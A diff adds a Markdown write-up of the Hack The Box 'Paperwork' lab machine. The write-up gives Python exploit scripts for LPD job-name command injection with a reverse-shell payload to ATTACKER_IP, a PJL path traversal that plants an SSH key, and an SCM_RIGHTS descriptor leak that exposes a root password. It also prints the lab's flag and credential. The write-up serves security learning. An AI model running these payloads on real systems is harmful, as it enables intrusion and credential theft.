@@ -1,0 +1,685 @@
+<div align="center">
+
+# 🖨️ HTB — Paperwork — Walkthrough by Safwen Amaira (Born As Root)
+
+**Easy · Linux · EU Machines 3**
+
+![Status](https://img.shields.io/badge/status-in--progress-yellow)
+![Difficulty](https://img.shields.io/badge/difficulty-easy-brightgreen)
+![OS](https://img.shields.io/badge/OS-Linux-blue)
+![XP](https://img.shields.io/badge/XP-585-orange)
+
+</div>
+
+---
+
+## 📋 Machine Info
+
+| Field          | Value              |
+| -------------- | ------------------ |
+| **Target IP**  | `10.129.248.117`   |
+| **Hostname**   | `paperwork.htb`    |
+| **OS**         | Linux (Ubuntu)     |
+| **Difficulty** | Easy               |
+| **Released**   | 11 July 2026       |
+| **Status**     | ✅ User owned · 🔄 Root in progress |
+
+---
+
+## 📑 Table of Contents
+
+* [1. Reconnaissance](#1-reconnaissance)
+* [2. Task Answers Recap](#2-task-answers-recap)
+* [3. The Full Port Scan Nobody Asked For](#3-the-full-port-scan-nobody-asked-for)
+* [4. Meeting the Printer That Isn't a Printer](#4-meeting-the-printer-that-isnt-a-printer)
+* [5. Downloading the Evidence Against Itself](#5-downloading-the-evidence-against-itself)
+* [6. Command Injection, or: Never Trust a Job Name](#6-command-injection-or-never-trust-a-job-name)
+* [7. Foothold as lp](#7-foothold-as-lp)
+* [8. The Second Printer, Now With Traversal](#8-the-second-printer-now-with-traversal)
+* [9. User Flag](#9-user-flag)
+* [10. The Socket That Snitches on Itself](#10-the-socket-that-snitches-on-itself)
+* [11. Where We Currently Stand on Root](#11-where-we-currently-stand-on-root)
+* [12. Summary and Lessons Learned](#12-summary-and-lessons-learned)
+* [13. Tools Used](#13-tools-used)
+
+---
+
+# 1. Reconnaissance
+
+## 🔎 Initial Port Scan
+
+```bash
+nmap paperwork.htb
+```
+
+<details>
+<summary><strong>📄 Raw Output</strong> (click to expand)</summary>
+
+```text
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+```
+
+</details>
+
+> **📝 My Explanation:**
+
+Two ports open. SSH and HTTP. The classic "nothing to see here" starter pack that every HTB box uses to lure you into a false sense of "this will be a quiet evening."
+
+Visiting the web server redirected me to `paperwork.htb`, so I added the line to `/etc/hosts` like every pentester has done a thousand times before, muscle memory fully engaged, and reloaded the page.
+
+The site introduced itself as **"Corporate Systems: Department of Records & Archives, Intake Portal"**, which is corporate speak for "we still run 1980s printer protocols and honestly we are proud of it." The page told us, out loud, without being asked:
+
+- Protocol: `RFC 1179` (that's LPD, the Line Printer Daemon)
+- Target Queue: `archive_intake`
+- Internal Processor: `paperwork-archive-v1.02`
+
+Seeing RFC 1179 mentioned on a box that only shows ports 22 and 80 is the machine winking at you and saying "there is more, go find it."
+
+---
+
+# 2. Task Answers Recap
+
+For anyone skimming for the actual answers before reading the story, here they are up front.
+
+| # | Question | Answer |
+|---|----------|--------|
+| 1 | Non standard TCP port hosting the LPD service | `1515` |
+| 2 | Queue name required by the LPD daemon | `archive_intake` |
+| 3 | Vulnerable line in `server.py` | `subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)` |
+| 4 | Vulnerability class in the LPD daemon | Command Injection via unsanitized job name |
+| 5 | Initial foothold user | `lp` |
+| 6 | Local only PJL/JetDirect port | `9100` |
+| 7 | Vulnerability class in `jetdirect.py` | Path Traversal in filename translation |
+| 8 | User flag | `7e81095620bf425c90ec56b7729f3aa3` |
+| 9 | Root owned daemon leaking file descriptors | `paperwork-daemon` via `/run/paperwork/mgmt.sock` |
+| 10 | Leaked admin credential | `ADMIN_PASSWORD=ApparelMortuaryCedar22` |
+| 11 | Root flag | pending, see section 11 |
+
+---
+
+# 3. The Full Port Scan Nobody Asked For
+
+```bash
+nmap -p- --min-rate 5000 -T4 paperwork.htb
+```
+
+<details>
+<summary><strong>📄 Raw Output</strong></summary>
+
+```text
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+1515/tcp open  ifor-protocol
+```
+
+</details>
+
+> **📝 My Explanation:**
+
+A full 65535 port scan revealed **1515/tcp**, labeled by nmap as `ifor-protocol`, which is nmap's polite way of saying "I have absolutely no idea what this is, good luck."
+
+Since the web page already dropped a very generous hint about RFC 1179, I ignored nmap's guess entirely and assumed this was LPD running on a suspiciously non default port. Somewhere a sysadmin thought "if I move it off port 515, nobody will find it." Adorable.
+
+### 💭 Side Thought
+
+Moving a service to a weird port does not make it secure. It just makes the pentester run one extra `-p-` scan, sigh audibly, and find it anyway five minutes later.
+
+---
+
+# 4. Meeting the Printer That Isn't a Printer
+
+To confirm it was actually speaking LPD, I sent a raw queue status command by hand.
+
+```bash
+printf '\x04archive_intake\n' | nc -q2 paperwork.htb 1515
+```
+
+```text
+Archive_Printer is ready and printing.
+```
+
+> **📝 My Explanation:**
+
+There it was. A live, custom LPD implementation, replying like an overly enthusiastic office printer that has never actually printed anything in its life. Real `lpd` does not typically greet you with a cheerful status line like that, which was clue number one that this was a homegrown Python service cosplaying as a real printer daemon.
+
+I scripted a full RFC 1179 job submission in Python, because raw netcat does not handle the binary framing and ACK bytes gracefully, and confirmed the handshake worked end to end. Every step came back with a clean `\x00` ACK, meaning the daemon happily swallowed a completely harmless test job.
+
+### Working RFC 1179 client (benign test)
+
+```python
+import socket
+
+target = "10.129.248.117"
+port = 1515
+queue = "archive_intake"
+
+def send_recv(s, data):
+    s.sendall(data)
+    return s.recv(4096)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target, port))
+
+resp = send_recv(s, f"\x02{queue}\n".encode())
+print("Job init:", resp)
+
+job_id = "001"
+hostname = "kali"
+cfile_name = f"cfA{job_id}{hostname}"
+cfile_content = f"Hhostname\nPuser\nJtestjob\nldfA{job_id}{hostname}\n"
+
+resp = send_recv(s, f"\x02{len(cfile_content)} {cfile_name}\n".encode())
+print("CF header ack:", resp)
+resp = send_recv(s, cfile_content.encode() + b"\x00")
+print("CF content ack:", resp)
+
+dfile_name = f"dfA{job_id}{hostname}"
+dfile_content = "hello from paperwork lab test\n"
+
+resp = send_recv(s, f"\x03{len(dfile_content)} {dfile_name}\n".encode())
+print("DF header ack:", resp)
+resp = send_recv(s, dfile_content.encode() + b"\x00")
+print("DF content ack:", resp)
+
+s.close()
+```
+
+```text
+Job init: b'\x00'
+CF header ack: b'\x00'
+CF content ack: b'\x00'
+DF header ack: b'\x00'
+DF content ack: b'\x00'
+```
+
+Five clean ACKs. The printer accepted the job like it had nothing better to do, which, to be fair, it did not.
+
+---
+
+# 5. Downloading the Evidence Against Itself
+
+Gobuster came back completely empty handed against `paperwork.htb`. No `/archive`, no `/jobs`, no `/queue`, absolutely nothing, this app was not going to fall to a wordlist. But the page source had a link hiding in plain sight.
+
+```html
+<a href="/download/archive"><code>paperwork-archive-v1.02</code></a>
+```
+
+```bash
+curl -s http://paperwork.htb/download/archive -o archive_download
+file archive_download
+```
+
+```text
+archive_download: Zip archive data, made by v3.0 UNIX...
+```
+
+```bash
+mkdir extracted && cd extracted
+unzip ../archive_download
+```
+
+```text
+Archive:  ../archive_download
+  inflating: server.py
+```
+
+> **📝 My Explanation:**
+
+The intranet portal was literally hosting a download link to its own backend source code. Unzipping it produced `server.py`, the entire LPD daemon, straight from the source. This is the security equivalent of a bank helpfully leaving the vault blueprints on a table in the lobby, next to a sign that says "please do not read this."
+
+### 💭 Side Thought
+
+If your intranet portal has a link labeled "Internal Processor" that resolves to a downloadable ZIP of your actual server code, you have already lost the game before I have even opened Burp Suite.
+
+---
+
+# 6. Command Injection, or: Never Trust a Job Name
+
+Reading `server.py`, one line stood out like a flashing neon sign in a dark alley.
+
+```python
+subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
+```
+
+`job_name` comes straight from the `J` line of the LPD control file, completely unsanitized, and gets dropped directly into a `shell=True` call. It sits inside single quotes in the shell command, so the plan was simple: close the quote, inject a command, comment out whatever comes after with `#`.
+
+Bonus discovery while reading the code: the handler only processes the first chunk received on a connection before executing and moving on. A full control file plus data file pair was not even required. Just the control file chunk with a poisoned `J` line does the job.
+
+### Exploit script
+
+```python
+import socket
+
+target = "10.129.248.117"
+port = 1515
+queue = "archive_intake"
+attacker_ip = "ATTACKER_IP"
+attacker_port = 4444
+
+def send_recv(s, data):
+    s.sendall(data)
+    return s.recv(4096)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target, port))
+
+resp = send_recv(s, f"\x02{queue}\n".encode())
+print("Job init:", resp)
+
+job_id = "003"
+hostname = "kali"
+cfile_name = f"cfA{job_id}{hostname}"
+
+payload = f"x'; bash -c \"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1\" #"
+cfile_content = f"Hhostname\nPuser\nJ{payload}\nldfA{job_id}{hostname}\n"
+
+resp = send_recv(s, f"\x02{len(cfile_content)} {cfile_name}\n".encode())
+print("CF header ack:", resp)
+
+s.sendall(cfile_content.encode())
+resp = s.recv(4096)
+print("Exec ack:", resp)
+
+s.close()
+```
+
+```bash
+nc -lvnp 4444
+```
+
+```bash
+python3 lpd_exploit.py
+```
+
+```text
+Job init: b'\x00'
+CF header ack: b'\x00'
+Exec ack: b'\x00'
+```
+
+```text
+Connection received on 10.129.248.117 48286
+lp@paperwork:/opt/LPDServer$
+```
+
+> **📝 My Explanation:**
+
+Command injection through a printer job name field. Somewhere, a 1970s protocol designer is deeply confused about what modern developers have done to their creation, and honestly, so am I, and I did it on purpose.
+
+---
+
+# 7. Foothold as lp
+
+Shell landed as `lp`, the printing subsystem's own service account, which felt thematically correct, like getting arrested by the mascot representing the exact crime you just committed.
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+```
+
+### Recon commands run
+
+```bash
+id
+hostname
+cat /etc/passwd | grep -E "sh$|bash$"
+ls -la /home/
+find / -name "user.txt" 2>/dev/null
+sudo -l
+find / -perm -4000 -type f 2>/dev/null
+ss -tulpn
+ps aux
+```
+
+### What we learned
+
+- `id` returned `uid=7(lp) gid=7(lp) groups=7(lp)`, so no fancy group memberships to abuse yet.
+- `archivist` user exists, home directory locked down at `750`, and `lp` is not in that group.
+- No `sudo` binary installed on the box at all. First time this happened on an easy box, `sudo -l` was simply not an option.
+- Nothing exploitable jumped out from the SUID binaries.
+- A Python process running specifically as `archivist`:
+  ```text
+  archivi+  989  /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log
+  ```
+- Port `9100` bound only to `127.0.0.1`.
+
+> **📝 My Explanation:**
+
+Port 9100 is the classic HP JetDirect raw PJL port. Paired with the archive and spool theme of this whole machine, this was obviously the next printer shaped rabbit hole, and I went down it without hesitation.
+
+---
+
+# 8. The Second Printer, Now With Traversal
+
+Poking the local service confirmed it spoke PJL.
+
+```bash
+cat > /tmp/leak.py << 'EOF'
+import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(3)
+s.connect(('127.0.0.1', 9100))
+s.send(b'@PJL FSUPLOAD NAME="jetdirect.py" OFFSET=0 SIZE=5119\r\n')
+data = b''
+try:
+    while True:
+        chunk = s.recv(4096)
+        if not chunk:
+            break
+        data += chunk
+except socket.timeout:
+    pass
+with open('/tmp/jetdirect_leak.py', 'wb') as f:
+    f.write(data)
+print('LENGTH:', len(data))
+s.close()
+EOF
+python3 /tmp/leak.py
+cat /tmp/jetdirect_leak.py
+```
+
+```text
+b'HP LASERJET 4ML\r\n'
+```
+
+`FSDIRLIST`, `FSUPLOAD`, and `FSDOWNLOAD` were all live and responding. Naturally I used `FSUPLOAD` to pull the daemon's own source code, and the bug was sitting right there in the path handling logic.
+
+```python
+def _translate(self, path):
+    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
+    return os.path.normpath(os.path.join(self._root, clean))
+```
+
+It strips `0:` and any leading slash, but does absolutely nothing about `../`. Classic, timeless, still works in 2026.
+
+### Read confirmation
+
+```bash
+cat > /tmp/read_test.py << 'EOF'
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(3)
+s.connect(('127.0.0.1', 9100))
+s.send(b'@PJL FSUPLOAD NAME="../../../../etc/passwd"\r\n')
+data = b''
+try:
+    while True:
+        chunk = s.recv(4096)
+        if not chunk: break
+        data += chunk
+except socket.timeout:
+    pass
+print(data.decode(errors='replace'))
+s.close()
+EOF
+python3 /tmp/read_test.py
+```
+
+Full `/etc/passwd` came back without a single complaint. Two printers, two separate path handling bugs, zero consistency in how badly this company writes filesystem code.
+
+### The write, after briefly miscounting my dots
+
+```bash
+cat > /tmp/write_key.py << 'EOF'
+import socket
+
+pubkey = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAe8Fp0f4BQLx0DpawVO76s/xM5LWvOGFJ8UvBXpg0yA lp@paperwork\n"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(5)
+s.connect(('127.0.0.1', 9100))
+
+cmd = f'@PJL FSDOWNLOAD NAME="../.ssh/authorized_keys" SIZE={len(pubkey)}\r\n'.encode()
+s.send(cmd)
+s.send(pubkey)
+
+try:
+    print(s.recv(4096))
+except socket.timeout:
+    print("no response (timeout)")
+
+s.close()
+EOF
+python3 /tmp/write_key.py
+```
+
+The first attempt used `../../` and landed on `FILEERROR=1` because that reached past `/home` entirely, into territory `archivist` cannot write to. One directory level too enthusiastic. Dialing it back to a single `../` (since `_root` is already `/home/archivist/printer`) put it exactly where it needed to be.
+
+```bash
+ssh -i /tmp/archivist_key archivist@127.0.0.1
+```
+
+```text
+archivist@paperwork:~$
+```
+
+> **📝 My Explanation:**
+
+The printer's "filesystem sandbox" had exactly one `../` worth of structural integrity, and not a single dot more. I dropped my own SSH public key into `archivist`'s `authorized_keys` through a fake printer's file upload feature, then simply SSH'd in like I was invited. No exploit development, no fuzzing, just very polite path traversal and one embarrassing miscount of relative directories.
+
+### 💭 Side Thought
+
+Between the LPD command injection and this PJL traversal, this box has now let me become two completely different users purely by talking nicely to printers. I genuinely miss the days when popping a shell required more than being polite to a print spooler.
+
+---
+
+# 9. User Flag
+
+```bash
+archivist@paperwork:~$ ls
+```
+
+```text
+printer  user.txt
+```
+
+```bash
+cat user.txt
+```
+
+```text
+7e81095620bf425c90ec56b7729f3aa3
+```
+
+### ✅ Answer
+
+```text
+7e81095620bf425c90ec56b7729f3aa3
+```
+
+### 💭 Side Thought
+
+Two shells, two vulnerable printer protocols, zero actual paperwork filed. This company's IT department needs a very stern email.
+
+---
+
+# 10. The Socket That Snitches on Itself
+
+Still no `sudo`, no crontab entries, nothing screaming "exploit me" in the SUID list. But `archivist` had read and write access to `/run/paperwork/mgmt.sock`, owned by `root:archivist`.
+
+```bash
+cat > /tmp/mgmt_test.py << 'EOF'
+import socket
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.settimeout(3)
+s.connect('/run/paperwork/mgmt.sock')
+s.send(b'help\n')
+try:
+    print(s.recv(4096))
+except socket.timeout:
+    print("no response")
+EOF
+python3 /tmp/mgmt_test.py
+```
+
+```text
+b'ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.'
+```
+
+Running it again, once the state had already reset:
+
+```text
+b'STATUS: SYSTEM_CLEAN\nSIGNATURE: d92938059e3e5371cf54db65d60963aecacedf69e493c44a8b618036b07cbdbe\n'
+```
+
+Reading `/usr/bin/paperwork-daemon`, running as root, explained everything at once.
+
+```python
+admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
+
+def scan_for_malice():
+    # checks commands.log for FSQUERY, FSUPLOAD, FSDOWNLOAD
+
+def trigger_lockdown(conn):
+    log_fd = os.open(LOG_PATH, os.O_RDONLY)
+    evidence_bundle = array.array("i", [log_fd, admin_fd])
+    msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
+    conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
+```
+
+> **📝 My Explanation:**
+
+This root owned "intrusion detection" daemon watches `commands.log` for exactly the PJL filesystem commands I had already used earlier while popping `archivist`. When it spots them, it "helpfully" sends forensic evidence to whoever happens to be connected, using `SCM_RIGHTS`. That mechanism passes actual open file descriptors, not just their contents. One of those descriptors is root's own already open read handle to `/etc/paperwork/admin_pins.conf`.
+
+The security monitoring feature is the vulnerability. The daemon built specifically to catch me tampering with the printer became the exact tool I used to read a root only file. Chef's kiss.
+
+### The grab
+
+Dirtied the log again with a harmless `FSQUERY`, then connected with a proper `recvmsg` based receiver built to actually catch the passed descriptors instead of ignoring the ancillary data like a plain socket would.
+
+```bash
+cat > /tmp/dirty_log.py << 'EOF'
+import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(3)
+s.connect(('127.0.0.1', 9100))
+s.send(b'@PJL FSQUERY NAME="/"\r\n')
+try:
+    print(s.recv(4096))
+except socket.timeout:
+    pass
+s.close()
+EOF
+python3 /tmp/dirty_log.py
+```
+
+```bash
+cat > /tmp/fd_grab.py << 'EOF'
+import socket, array, os
+
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.settimeout(10)
+s.connect('/run/paperwork/mgmt.sock')
+
+fds = array.array("i")
+msg, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_SPACE(64))
+print("Message:", msg)
+
+for cmsg_level, cmsg_type, cmsg_data in ancdata:
+    if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
+        fds.frombytes(cmsg_data[:len(cmsg_data) - (len(cmsg_data) % fds.itemsize)])
+
+print("Received FDs:", list(fds))
+
+for fd in fds:
+    try:
+        os.lseek(fd, 0, os.SEEK_SET)
+        content = os.read(fd, 4096)
+        print(f"--- FD {fd} content ---")
+        print(content.decode(errors='replace'))
+    except Exception as e:
+        print(f"FD {fd} error: {e}")
+
+s.close()
+EOF
+python3 /tmp/fd_grab.py
+```
+
+```text
+Message: b'ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.'
+Received FDs: [4, 5]
+--- FD 4 content ---
+[127.0.0.1] connected
+Command: @PJL FSQUERY NAME="/"
+
+--- FD 5 content ---
+ADMIN_PASSWORD=ApparelMortuaryCedar22
+```
+
+### ✅ Answer
+
+```text
+ADMIN_PASSWORD=ApparelMortuaryCedar22
+```
+
+### 💭 Side Thought
+
+Somewhere there is a security engineer who built this alerting system, tested it exactly once, watched it fire correctly, and never once stopped to ask "wait, what precisely am I attaching to this alert." File descriptor hygiene remains undefeated as a source of CTF flags in the year 2026.
+
+---
+
+# 11. Where We Currently Stand on Root
+
+Current asset in hand: `ADMIN_PASSWORD=ApparelMortuaryCedar22`, freshly exfiltrated from a root owned config file, courtesy of a security daemon that was supposed to be watching for intruders and instead handed one a snack.
+
+Avenues currently being tested, in order of laziness.
+
+```bash
+su - root
+```
+
+then, if that politely refuses:
+
+```bash
+ss -tulpn | grep 973
+find / -path "*/CorpoSite*" 2>/dev/null
+cat /proc/973/cmdline | tr '\0' ' '
+```
+
+since `ps aux` earlier showed a suspicious root owned Python process:
+
+```text
+root   973  /usr/bin/python3 /root/staging/CorpoSite/app.py
+```
+
+which smells exactly like an admin panel this password was made for.
+
+Root has not popped yet as of this writing. This section gets an update, and the status badge finally flips from 🔄 to 👑, the moment that password earns its keep.
+
+---
+
+# 12. Summary and Lessons Learned
+
+- **Two different printer protocols, two different path handling bugs.** If a box runs more than one printer emulator, check every single one of them, they will not share the same standard of quality control.
+- **Never build shell commands out of user controlled strings, even from a protocol older than most of your relatives.** `job_name` walked straight out of an LPD control file into `subprocess.Popen(..., shell=True)` with zero sanitization along the way.
+- **`../` still works in 2026.** Path traversal is the horror movie villain of protocol and web security, you think it is finally dead, and then it is right back in the sequel, wearing a slightly different mask.
+- **A "security alert" feature that leaks file descriptors is worse than having no alert at all.** `SCM_RIGHTS` is powerful and genuinely dangerous, passing a live file descriptor to an untrusted client is functionally identical to handing them root's own keyring.
+- **Do not host your own backend source code behind a link that literally says "Internal Processor."** Just do not. Please.
+
+---
+
+# 13. Tools Used
+
+- `nmap`
+- `nc` and raw Python sockets, for the hand rolled LPD and PJL clients
+- `gobuster`
+- `curl`, `whatweb`
+- `unzip`
+- `ssh-keygen`
+- Python 3, `socket` and `array` modules, for both exploitation and the `SCM_RIGHTS` file descriptor grab
+
+---
+
+<div align="center">
+
+## 🖨️ Paperwork, User Owned, Root Pending
+
+**HTB Easy · Linux**
+
+**Walkthrough by Safwen Amaira (Born As Root)**
+
+</div>
